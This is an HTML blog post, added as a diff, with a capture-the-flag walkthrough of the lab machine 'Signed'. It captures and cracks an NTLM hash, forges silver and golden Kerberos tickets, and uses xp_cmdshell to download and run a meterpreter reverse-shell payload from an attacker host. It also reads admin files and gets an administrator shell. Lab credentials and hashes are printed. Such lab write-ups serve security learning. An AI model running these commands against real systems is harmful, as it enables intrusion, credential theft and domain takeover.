@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Medium - Windows - Signed - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Medium - Windows - Signed</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1760265434086"
+                  >2025-10-12 12:37</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1760807413088"
+                  >2025-10-18 19:10</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>“As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH”, so we get to login using <code>impacket-mssqlclient 'signed.htb/scott:Sm230#C5NatH@10.129.66.12'</code>. We can do a quick nmap scan to learn more about the service.</p>
+<div><pre class="hljs"><code><span class="hljs-string">nmap</span> <span class="hljs-string">--script</span> <span class="hljs-string">ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes</span> <span class="hljs-string">--script-args</span> <span class="hljs-string">mssql.instance-port=1433,mssql.username=scott,mssql.password=Sm230#C5NatH,mssql.instance-name=MSSQLSERVER</span> <span class="hljs-string">-sV</span> <span class="hljs-string">-p</span> <span class="hljs-number">1433 </span><span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+<span class="hljs-string">Starting</span> <span class="hljs-string">Nmap</span> <span class="hljs-number">7.95</span> <span class="hljs-string">(</span> <span class="hljs-string">https://nmap.org</span> <span class="hljs-string">)</span> <span class="hljs-string">at</span> <span class="hljs-number">2025-10-12 </span><span class="hljs-number">15</span><span class="hljs-string">:16</span> <span class="hljs-string">BST</span>
+<span class="hljs-string">Nmap</span> <span class="hljs-string">scan</span> <span class="hljs-string">report</span> <span class="hljs-string">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+<span class="hljs-string">Host</span> <span class="hljs-string">is</span> <span class="hljs-string">up</span> <span class="hljs-string">(0.035s</span> <span class="hljs-string">latency).</span>
+
+<span class="hljs-attr">Bug in ms-sql-dac:</span> <span class="hljs-literal">no</span> <span class="hljs-string">string</span> <span class="hljs-string">output.</span>
+<span class="hljs-string">PORT</span>     <span class="hljs-string">STATE</span> <span class="hljs-string">SERVICE</span>  <span class="hljs-string">VERSION</span>
+<span class="hljs-number">1433</span><span class="hljs-string">/tcp</span> <span class="hljs-string">open</span>  <span class="hljs-string">ms-sql-s</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022 </span><span class="hljs-number">16.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span><span class="hljs-string">;</span> <span class="hljs-string">RTM</span>
+<span class="hljs-string">|_ms-sql-config:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-info:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-attr">Version:</span> 
+<span class="hljs-string">|</span>       <span class="hljs-attr">name:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022 </span><span class="hljs-string">RTM</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">number:</span> <span class="hljs-number">16.00</span><span class="hljs-number">.1000</span><span class="hljs-number">.00</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Product:</span> <span class="hljs-string">Microsoft</span> <span class="hljs-string">SQL</span> <span class="hljs-string">Server</span> <span class="hljs-number">2022</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Service pack level:</span> <span class="hljs-string">RTM</span>
+<span class="hljs-string">|</span>       <span class="hljs-attr">Post-SP patches applied:</span> <span class="hljs-literal">false</span>
+<span class="hljs-string">|_</span>    <span class="hljs-attr">TCP port:</span> <span class="hljs-number">1433</span>
+<span class="hljs-string">|_ms-sql-hasdbaccess:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|_ms-sql-tables:</span> <span class="hljs-attr">ERROR:</span> <span class="hljs-string">Script</span> <span class="hljs-string">execution</span> <span class="hljs-string">failed</span> <span class="hljs-string">(use</span> <span class="hljs-string">-d</span> <span class="hljs-string">to</span> <span class="hljs-string">debug)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-xp-cmdshell:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-string">(Use</span> <span class="hljs-string">--script-args=ms-sql-xp-cmdshell.cmd='&lt;CMD&gt;'</span> <span class="hljs-string">to</span> <span class="hljs-string">change</span> <span class="hljs-string">command.)</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-dump-hashes:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-string">sa:Null</span>
+<span class="hljs-string">|_</span>    <span class="hljs-string">scott:Null</span>
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-empty-password:</span> 
+<span class="hljs-string">|_</span>  <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span> <span class="hljs-attr">ms-sql-ntlm-info:</span> 
+<span class="hljs-string">|</span>   <span class="hljs-attr">10.129.66.12:1433:</span> 
+<span class="hljs-string">|</span>     <span class="hljs-attr">Target_Name:</span> <span class="hljs-string">SIGNED</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">NetBIOS_Domain_Name:</span> <span class="hljs-string">SIGNED</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">NetBIOS_Computer_Name:</span> <span class="hljs-string">DC01</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Domain_Name:</span> <span class="hljs-string">SIGNED.HTB</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Computer_Name:</span> <span class="hljs-string">DC01.SIGNED.HTB</span>
+<span class="hljs-string">|</span>     <span class="hljs-attr">DNS_Tree_Name:</span> <span class="hljs-string">SIGNED.HTB</span>
+<span class="hljs-string">|_</span>    <span class="hljs-attr">Product_Version:</span> <span class="hljs-number">10.0</span><span class="hljs-number">.17763</span></code></pre></div>
+<p>Looking online, we can find CVE-2024-37334, but no POC.</p>
+<div><pre class="hljs"><code><span class="hljs-selector-tag">SQL</span> (scott  guest<span class="hljs-variable">@master</span>)&gt; <span class="hljs-selector-tag">SELECT</span> <span class="hljs-selector-tag">name</span> <span class="hljs-selector-tag">FROM</span> <span class="hljs-selector-tag">sys</span><span class="hljs-selector-class">.databases</span>;
+
+<span class="hljs-selector-tag">master</span>   
+<span class="hljs-selector-tag">tempdb</span>  
+<span class="hljs-selector-tag">model</span>    
+<span class="hljs-selector-tag">msdb</span>     </code></pre></div>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[/home/kali/PowerUpSQL]
+└─PS&gt; Get-SQLServerInfo -Instance <span class="hljs-string">"10.129.66.12"</span> -Username <span class="hljs-string">"scott"</span> -Password <span class="hljs-string">"Sm230#C5NatH"</span>
+
+ComputerName           : 10.129.66.12
+Instance               : <span class="hljs-type">DC01</span>
+DomainName             : <span class="hljs-type">SIGNED</span>
+ServiceProcessID       : 888
+ServiceName            : <span class="hljs-type">MSSQLSERVER</span>
+ServiceAccount         : <span class="hljs-type">SIGNED</span>\mssqlsvc
+AuthenticationMode     : <span class="hljs-type">Windows</span> <span class="hljs-keyword">and</span> SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : <span class="hljs-type">No</span>
+SQLServerVersionNumber : 16.0.1000.6
+SQLServerMajorVersion  : 2022
+SQLServerEdition       : <span class="hljs-type">Enterprise</span> Evaluation Edition (<span class="hljs-number">64</span>-bit)
+SQLServerServicePack   : <span class="hljs-type">RTM</span>
+OSArchitecture         : <span class="hljs-type">X64</span>
+OsVersionNumber        : <span class="hljs-type">SQL</span>
+Currentlogin           : <span class="hljs-type">scott</span>
+IsSysadmin             : <span class="hljs-type">No</span>
+ActiveSessions         : 1</code></pre></div>
+<p>The service account is different than the user we logged in as. We can run <code>responder -I tun0</code> and try to execute <code>xp_dirtree</code> against it and crack the hash using john.</p>
+<div><pre class="hljs"><code><span class="hljs-string">SQL</span> <span class="hljs-string">(scott</span>  <span class="hljs-string">guest@master)&gt;</span> <span class="hljs-string">xp_dirtree</span> <span class="hljs-string">\\&lt;ip&gt;\thissharedoesntexist</span>
+
+<span class="hljs-meta">---
+</span>
+<span class="hljs-string">┌──(kali㉿kali)-[~]</span>
+<span class="hljs-string">└─$</span> <span class="hljs-string">sudo</span> <span class="hljs-string">responder</span> <span class="hljs-string">-I</span> <span class="hljs-string">tun0</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Client   :</span> <span class="hljs-number">10.129</span><span class="hljs-number">.66</span><span class="hljs-number">.12</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Username :</span> <span class="hljs-string">SIGNED\mssqlsvc</span>
+[<span class="hljs-string">SMB</span>] <span class="hljs-attr">NTLMv2-SSP Hash     :</span> <span class="hljs-string">mssqlsvc::SIGNED:650c1aad4a692032:E5302536320D71D5B5F435698F28BC9A:010100000000000000FD1EB8853BDC0192F4AE5975C9A5DC0000000002000800370034004B004F0001001E00570049004E002D00380039004D004D00530031005A004A0057003300390004003400570049004E002D00380039004D004D00530031005A004A005700330039002E00370034004B004F002E004C004F00430041004C0003001400370034004B004F002E004C004F00430041004C0005001400370034004B004F002E004C004F00430041004C000700080000FD1EB8853BDC0106000400020000000800300030000000000000000000000000300000319EE653B160B28341C3ED4C355F4C30C500A5FDC80C37A5B308A91448C2B9F00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00370031000000000000000000</span></code></pre></div>
+<p>We then get to crack the hash.</p>
+<div><pre class="hljs"><code>┌──(kali㉿kali)-[~]
+└─$ sudo john --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt hash.txt
+Will run <span class="hljs-number">8</span> OpenMP threads
+Press <span class="hljs-string">'q'</span> or Ctrl-C to abort, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status
+purPLE9795!@     (mssqlsvc)    </code></pre></div>
+<p>Later we can find all of the admins on this mssql.</p>
+<div><pre class="hljs"><code>impacket-mssqlclient 'signed.htb/mssqlsvc:purPLE9795!@@10.129.66.12' -windows-auth -command "<span class="hljs-keyword">SELECT</span> r.name <span class="hljs-keyword">AS</span> <span class="hljs-keyword">role</span>, m.name <span class="hljs-keyword">AS</span> member <span class="hljs-keyword">FROM</span> sys.server_principals r <span class="hljs-keyword">JOIN</span> sys.server_role_members rm <span class="hljs-keyword">ON</span> r.principal_id=rm.role_principal_id <span class="hljs-keyword">JOIN</span> sys.server_principals m <span class="hljs-keyword">ON</span> rm.member_principal_id=m.principal_id <span class="hljs-keyword">WHERE</span> r.name=<span class="hljs-string">'sysadmin'</span>;" 
+
+
+role       member                      
+--------   -------------------------   
+sysadmin   sa                          
+sysadmin   SIGNED\IT                   
+sysadmin   NT SERVICE\SQLWriter        
+sysadmin   NT SERVICE\Winmgmt          
+sysadmin   NT SERVICE\MSSQLSERVER      
+sysadmin   NT SERVICE\SQLSERVERAGENT   </code></pre></div>
+<p>We can also get domain sid with <code>SELECT name, sid FROM sys.server_principals WHERE sid IS NOT NULL AND name LIKE 'SIGNED%';</code> and gain a silver ticket with ticketer. To get it, it’s required that (WITHOUT CHATGPT) you get domain sid and password hash.</p>
+<div><pre class="hljs"><code><span class="hljs-attribute">impacket</span>-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">4088429403</span>-<span class="hljs-number">1159899800</span>-<span class="hljs-number">2753317549</span> -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:<span class="hljs-number">1433</span> -groups <span class="hljs-number">1105</span> -user-id <span class="hljs-number">1103</span> mssqlsvc</code></pre></div>
+<p>Then it’s possible to login using <code>export KRB5CCNAME=mssqlsvc.ccache &amp;&amp; impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB</code> and finally enable powershell using <code>enable_xp_cmdshell</code> and <code>RECONFIGURE;</code>.</p>
+<div><pre class="hljs"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.15.22 LPORT=2137 -f exe &gt; shell-x64.exe
+sudo http-server -p 80           
+<span class="hljs-section">...and catch with metasploit
+---</span>
+
+xp<span class="hljs-emphasis">_cmdshell "powershell wget -UseBasicParsing http://10.10.15.22/shell-x64.exe -OutFile %temp%/shell-x64.exe"
+xp_</span>cmdshell "%temp%\\shell-x64.exe -nv 10.10.15.22 4444 -e cmd.exe"</code></pre></div>
+<p>and we finaly get user flag with <code>cat /Users/mssqlsvc/Desktop/user.txt</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We continue signed, by signing more tickets. Time for the golden ticket. To get it, one of these two sids are needed.</p>
+<div><pre class="hljs"><code>PS C:\Windows\system32&gt; <span class="hljs-keyword">Get</span>-ADGroup "Domain Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+<span class="hljs-keyword">Get</span>-ADGroup "Domain Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+
+<span class="hljs-type">Name</span>          SID                                          
+<span class="hljs-comment">----          ---                                          </span>
+<span class="hljs-keyword">Domain</span> Admins S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span><span class="hljs-number">-512</span>
+
+
+PS C:\Windows\system32&gt; <span class="hljs-keyword">Get</span>-ADGroup "Enterprise Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+<span class="hljs-keyword">Get</span>-ADGroup "Enterprise Admins" | <span class="hljs-keyword">Select</span>-<span class="hljs-keyword">Object</span> <span class="hljs-type">Name</span>, SID
+
+<span class="hljs-type">Name</span>              SID                                          
+<span class="hljs-comment">----              ---                                          </span>
+Enterprise Admins S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span><span class="hljs-number">-519</span>
+
+<span class="hljs-comment">---</span>
+
+impacket-ticketer -nthash EF699384C3285C54128A3EE1DDB1A0CC -<span class="hljs-keyword">domain</span>-sid S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-4088429403</span><span class="hljs-number">-1159899800</span><span class="hljs-number">-2753317549</span> -<span class="hljs-keyword">domain</span> SIGNED.HTB -spn MSSQLSvc/DC01.SIGNED.HTB -<span class="hljs-keyword">groups</span> <span class="hljs-number">512</span>,<span class="hljs-number">519</span>,<span class="hljs-number">1105</span> -<span class="hljs-keyword">user</span>-id <span class="hljs-number">1103</span> mssqlsvc
+
+export KRB5CCNAME=mssqlsvc.ccache &amp;&amp; impacket-mssqlclient -k -<span class="hljs-keyword">no</span>-pass DC01.SIGNED.HTB</code></pre></div>
+<p>Then we can enable data access and grab the flag.</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>;
+RECONFIGURE;
+<span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">'Ad Hoc Distributed Queries'</span>, <span class="hljs-number">1</span>;
+RECONFIGURE;
+<span class="hljs-built_in">SELECT</span> * <span class="hljs-keyword">FROM</span> OPENROWSET(BULK <span class="hljs-string">'C:\Users\Administrator\Desktop\root.txt'</span>,SINGLE_CLOB) AS x;</code></pre></div>
+<p>To properly own the machine, password and username of admin can be found in powershell history.<br />
+<code>SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',SINGLE_CLOB) AS x;</code></p>
+<p>Then we can upload and run RunasCs.exe to gain privilaged shell<br />
+<code>.\RunasCs.exe Administrator Th1s889Rabb!t powershell.exe -r ip 2138</code></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
